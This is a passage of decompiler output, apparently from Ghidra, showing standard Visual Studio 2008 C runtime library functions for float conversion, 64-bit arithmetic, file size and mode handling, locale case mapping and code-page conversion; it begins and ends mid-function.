    uVar3 = uVar3 + 0x3c01;
    local_8 = 0;
  }
  else if (uVar3 == 0x7ff) {
    uVar3 = 0x7fff;
  }
  else {
    uVar3 = uVar3 + 0x3c00;
  }
  param_1[1] = uVar1 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  *param_1 = uVar1 << 0xb;
  while (local_8 == 0) {
    uVar1 = param_1[1];
    uVar3 = uVar3 - 1;
    param_1[1] = uVar1 * 2 | *param_1 >> 0x1f;
    *param_1 = *param_1 * 2;
    local_8 = uVar1 * 2 & 0x80000000;
  }
  uVar4 = uVar4 | uVar3;
LAB_00425348:
  *(ushort *)(param_1 + 2) = uVar4;
  return;
}



// Library Function - Single Match
//  __fltout2
// 
// Library: Visual Studio 2008 Release

STRFLT __cdecl __fltout2(_CRT_DOUBLE _Dbl,STRFLT _Flt,char *_ResultStr,size_t _SizeInBytes)

{
  int iVar1;
  errno_t eVar2;
  STRFLT p_Var3;
  short local_30;
  char local_2e;
  char local_2c [24];
  uint local_14;
  uint uStack_10;
  ushort uStack_c;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  ___dtold(&local_14,(uint *)&_Dbl);
  iVar1 = __I10_OUTPUT(local_14,uStack_10,uStack_c,0x11,0,&local_30);
  _Flt->flag = iVar1;
  _Flt->sign = (int)local_2e;
  _Flt->decpt = (int)local_30;
  eVar2 = _strcpy_s(_ResultStr,_SizeInBytes,local_2c);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  _Flt->mantissa = _ResultStr;
  p_Var3 = (STRFLT)___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return p_Var3;
}



// Library Function - Single Match
//  __alldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullshr
// 
// Library: Visual Studio 2008 Release

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



// Library Function - Single Match
//  __controlfp_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  uint uVar1;
  int *piVar2;
  errno_t eVar3;
  
  uVar1 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar1 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar1);
    }
    else {
      uVar1 = __control87(_NewValue,uVar1);
      *_CurrentState = uVar1;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar1 = __control87(0,0);
      *_CurrentState = uVar1;
    }
    piVar2 = __errno();
    eVar3 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar3;
}



// Library Function - Single Match
//  _atol
// 
// Library: Visual Studio 2008 Release

long __cdecl _atol(char *_Str)

{
  long lVar1;
  
  lVar1 = _strtol(_Str,(char **)0x0,10);
  return lVar1;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
  int iVar1;
  HANDLE pvVar2;
  LPVOID _Buf;
  int *piVar3;
  int iVar4;
  uint uVar5;
  ulong *puVar6;
  BOOL BVar7;
  uint uVar8;
  int unaff_EDI;
  int iVar9;
  bool bVar10;
  bool bVar11;
  ulonglong uVar12;
  longlong lVar13;
  uint in_stack_00000008;
  DWORD DVar14;
  SIZE_T dwBytes;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  uVar12 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
  if (uVar12 == 0xffffffffffffffff) goto LAB_00425602;
  lVar13 = __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  iVar4 = (int)((ulonglong)lVar13 >> 0x20);
  if (lVar13 == -1) goto LAB_00425602;
  uVar8 = in_stack_00000008 - (uint)lVar13;
  uVar5 = (uint)(in_stack_00000008 < (uint)lVar13);
  iVar1 = (int)_Size - iVar4;
  iVar9 = iVar1 - uVar5;
  if ((iVar9 < 0) ||
     ((iVar9 == 0 || (SBORROW4((int)_Size,iVar4) != SBORROW4(iVar1,uVar5)) != iVar9 < 0 &&
      (uVar8 == 0)))) {
    if ((iVar9 < 1) && (iVar9 < 0)) {
      lVar13 = __lseeki64_nolock(_FileHandle,_Size & 0xffffffff,unaff_EDI);
      if (lVar13 == -1) goto LAB_00425602;
      pvVar2 = (HANDLE)__get_osfhandle(_FileHandle);
      BVar7 = SetEndOfFile(pvVar2);
      local_14 = (BVar7 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        piVar3 = __errno();
        *piVar3 = 0xd;
        puVar6 = ___doserrno();
        DVar14 = GetLastError();
        *puVar6 = DVar14;
        goto LAB_00425700;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar14 = 8;
    pvVar2 = GetProcessHeap();
    _Buf = HeapAlloc(pvVar2,DVar14,dwBytes);
    if (_Buf == (LPVOID)0x0) {
      piVar3 = __errno();
      *piVar3 = 0xc;
      goto LAB_00425602;
    }
    iVar4 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      uVar5 = uVar8;
      if ((-1 < iVar9) && ((0 < iVar9 || (0xfff < uVar8)))) {
        uVar5 = 0x1000;
      }
      uVar5 = __write_nolock(_FileHandle,_Buf,uVar5);
      if (uVar5 == 0xffffffff) break;
      bVar10 = uVar8 < uVar5;
      uVar8 = uVar8 - uVar5;
      bVar11 = SBORROW4(iVar9,(int)uVar5 >> 0x1f);
      iVar1 = iVar9 - ((int)uVar5 >> 0x1f);
      iVar9 = iVar1 - (uint)bVar10;
      if ((iVar9 < 0) ||
         ((iVar9 == 0 || (bVar11 != SBORROW4(iVar1,(uint)bVar10)) != iVar9 < 0 && (uVar8 == 0))))
      goto LAB_00425654;
    }
    puVar6 = ___doserrno();
    if (*puVar6 == 5) {
      piVar3 = __errno();
      *piVar3 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_00425654:
    __setmode_nolock(_FileHandle,iVar4);
    DVar14 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar14,_Buf);
LAB_00425700:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_00425602;
  }
  lVar13 = __lseeki64_nolock(_FileHandle,uVar12 >> 0x20,unaff_EDI);
  if (lVar13 != -1) {
    return 0;
  }
LAB_00425602:
  piVar3 = __errno();
  return *piVar3;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  int iVar1;
  int *piVar2;
  char cVar3;
  byte bVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  piVar2 = &DAT_00437d80 + (_FileHandle >> 5);
  iVar7 = (_FileHandle & 0x1fU) * 0x40;
  iVar1 = *piVar2 + iVar7;
  cVar3 = *(char *)(iVar1 + 0x24);
  bVar4 = *(byte *)(iVar1 + 4);
  if (_Mode == 0x4000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else if (_Mode == 0x8000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) & 0x7f;
  }
  else {
    if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x82 | 2;
    }
    else {
      if (_Mode != 0x40000) goto LAB_004257ce;
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x81 | 1;
    }
    *pbVar5 = bVar6;
  }
LAB_004257ce:
  if ((bVar4 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar3 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



// Library Function - Single Match
//  __get_fmode
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __get_fmode(int *_PMode)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_PMode == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    eVar2 = 0x16;
  }
  else {
    *_PMode = DAT_00436b28;
    eVar2 = 0;
  }
  return eVar2;
}



// Library Function - Single Match
//  __towlower_l
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __towlower_l(wint_t _C,_locale_t _Locale)

{
  wchar_t *_DWMapFlag;
  wint_t wVar1;
  int iVar2;
  undefined2 in_stack_00000006;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  wVar1 = 0xffff;
  if (_C != 0xffff) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    _DWMapFlag = (local_18.locinfo)->lc_category[0].wlocale;
    if (_DWMapFlag == (wchar_t *)0x0) {
      wVar1 = _C;
      if ((ushort)(_C - 0x41) < 0x1a) {
        wVar1 = _C + 0x20;
      }
    }
    else if (_C < 0x100) {
      iVar2 = __iswctype_l(_C,1,&local_18);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = (wint_t)*(byte *)((int)local_18.locinfo[1].lc_category[0].wlocale + (__C & 0xffff));
      }
    }
    else {
      iVar2 = ___crtLCMapStringW((LPCWSTR)&local_18,(DWORD)_DWMapFlag,(LPCWSTR)0x100,(int)&_C,
                                 (LPWSTR)0x1,(int)local_8);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = local_8[0];
      }
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return wVar1;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2008 Release

void __cdecl ___initconout(void)

{
  DAT_00433c84 = CreateFileA("CONOUT$",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  ___ansicp
// 
// Library: Visual Studio 2008 Release

void __cdecl ___ansicp(LCID param_1)

{
  int iVar1;
  CHAR local_10 [6];
  undefined local_a;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  local_a = 0;
  iVar1 = GetLocaleInfoA(param_1,0x1004,local_10,6);
  if (iVar1 != 0) {
    _atol(local_10);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  ___convertcp
// 
// Library: Visual Studio 2008 Release

void __cdecl
___convertcp(UINT param_1,UINT param_2,char *param_3,uint *param_4,LPSTR param_5,int param_6)

{
  uint _Size;
  uint cbMultiByte;
  bool bVar1;
  BOOL BVar2;
  size_t sVar3;
  undefined4 *puVar4;
  int iVar5;
  LPSTR lpMultiByteStr;
  uint uVar6;
  bool bVar7;
  undefined4 *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  cbMultiByte = *param_4;
  bVar1 = false;
  if (param_1 == param_2) goto LAB_00425b11;
  BVar2 = GetCPInfo(param_1,&local_1c);
  if ((((BVar2 == 0) || (local_1c.MaxCharSize != 1)) ||
      (BVar2 = GetCPInfo(param_2,&local_1c), BVar2 == 0)) || (local_1c.MaxCharSize != 1)) {
    uVar6 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)0x0,0);
    bVar7 = uVar6 == 0;
    if (bVar7) goto LAB_00425b11;
  }
  else {
    bVar1 = true;
    uVar6 = cbMultiByte;
    if (cbMultiByte == 0xffffffff) {
      sVar3 = _strlen(param_3);
      uVar6 = sVar3 + 1;
    }
    bVar7 = uVar6 == 0;
  }
  if ((bVar7 || (int)uVar6 < 0) || (0x7ffffff0 < uVar6)) {
    local_20 = (undefined4 *)0x0;
  }
  else {
    _Size = uVar6 * 2 + 8;
    if (_Size < 0x401) {
      puVar4 = (undefined4 *)&stack0xffffffbc;
      local_20 = (undefined4 *)&stack0xffffffbc;
      if (&stack0x00000000 != (undefined *)0x44) {
LAB_00425a51:
        local_20 = puVar4 + 2;
      }
    }
    else {
      puVar4 = (undefined4 *)_malloc(_Size);
      local_20 = puVar4;
      if (puVar4 != (undefined4 *)0x0) {
        *puVar4 = 0xdddd;
        goto LAB_00425a51;
      }
    }
  }
  if (local_20 != (undefined4 *)0x0) {
    _memset(local_20,0,uVar6 * 2);
    iVar5 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)local_20,uVar6);
    if (iVar5 != 0) {
      if (param_5 == (LPSTR)0x0) {
        if (((bVar1) ||
            (uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,(LPSTR)0x0,0,(LPCSTR)0x0,
                                         (LPBOOL)0x0), uVar6 != 0)) &&
           (lpMultiByteStr = (LPSTR)__calloc_crt(1,uVar6), lpMultiByteStr != (LPSTR)0x0)) {
          uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,lpMultiByteStr,uVar6,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
          if (uVar6 == 0) {
            _free(lpMultiByteStr);
          }
          else if (cbMultiByte != 0xffffffff) {
            *param_4 = uVar6;
          }
        }
      }
      else {
        WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,param_5,param_6,(LPCSTR)0x0,
                            (LPBOOL)0x0);
      }
    }
    __freea(local_20);
  }
LAB_00425b11:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2008 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  __flswbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flswbuf(int _Ch,FILE *_File)

{
  uint uVar1;
  char *_Buf;
  char *pcVar2;
  uint _FileHandle;
  int *piVar3;
  undefined **ppuVar4;
  int iVar5;
  undefined *puVar6;
  int unaff_EDI;
  uint _MaxCharCount;
  longlong lVar7;
  undefined4 local_8;
  
  _FileHandle = __fileno(_File);
  uVar1 = _File->_flag;
  if ((uVar1 & 0x82) == 0) {
    piVar3 = __errno();
    *piVar3 = 9;
LAB_00425b82:
    _File->_flag = _File->_flag | 0x20;
    return 0xffff;
  }
  if ((uVar1 & 0x40) != 0) {
    piVar3 = __errno();
    *piVar3 = 0x22;
    goto LAB_00425b82;
  }
  if ((uVar1 & 1) != 0) {
    _File->_cnt = 0;
    if ((uVar1 & 0x10) == 0) {
      _File->_flag = uVar1 | 0x20;
      return 0xffff;
    }
    _File->_ptr = _File->_base;
    _File->_flag = uVar1 & 0xfffffffe;
  }
  uVar1 = _File->_flag;
  _File->_cnt = 0;
  local_8 = 0;
  _MaxCharCount = 2;
  _File->_flag = uVar1 & 0xffffffef | 2;
  if (((uVar1 & 0x10c) == 0) &&
     (((ppuVar4 = FUN_00419b14(), _File != (FILE *)(ppuVar4 + 8) &&
       (ppuVar4 = FUN_00419b14(), _File != (FILE *)(ppuVar4 + 0x10))) ||
      (iVar5 = __isatty(_FileHandle), iVar5 == 0)))) {
    __getbuf(_File);
  }
  if ((_File->_flag & 0x108U) == 0) {
    local_8 = CONCAT22(local_8._2_2_,(short)_Ch);
    local_8 = __write(_FileHandle,&local_8,2);
  }
  else {
    _Buf = _File->_base;
    pcVar2 = _File->_ptr;
    _File->_ptr = _Buf + 2;
    _MaxCharCount = (int)pcVar2 - (int)_Buf;
    _File->_cnt = _File->_bufsiz + -2;
    if ((int)_MaxCharCount < 1) {
      if ((_FileHandle == 0xffffffff) || (_FileHandle == 0xfffffffe)) {
        puVar6 = &DAT_00433150;
      }
      else {
        puVar6 = (undefined *)((_FileHandle & 0x1f) * 0x40 + (&DAT_00437d80)[(int)_FileHandle >> 5])
        ;
      }
      if (((puVar6[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64(_FileHandle,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_00425cb9;
    }
    else {
      local_8 = __write(_FileHandle,_Buf,_MaxCharCount);
    }
    *(short *)_File->_base = (short)_Ch;
  }
  if (local_8 == _MaxCharCount) {
    return _Ch & 0xffff;
  }
LAB_00425cb9:
  _File->_flag = _File->_flag | 0x20;
  return 0xffff;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_00426289;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_00433c98 - 1;
    iVar6 = (int)(DAT_00433c98 + ((int)DAT_00433c98 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_00433c98 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_00425ebd;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_00425ec4;
LAB_00425ebd:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_00425ec4:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_00425ed2;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_00425ed2:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_00433c94 - DAT_00433c98)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_00433c94 < iVar14) {
        if (iVar14 < DAT_00433c90) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_00433ca4;
          iVar4 = (int)(DAT_00433c9c + ((int)DAT_00433c9c >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_00433c9c & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_00433c9c + ((int)DAT_00433c9c >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_00433c9c & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_00433ca4 + DAT_00433c90;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_00426289;
      }
      local_14 = DAT_00433c94 - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_00433c98 - 1;
      iVar14 = (int)(DAT_00433c98 + ((int)DAT_00433c98 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_00433c98 & 0x8000001f;
      local_10 = iVar14;
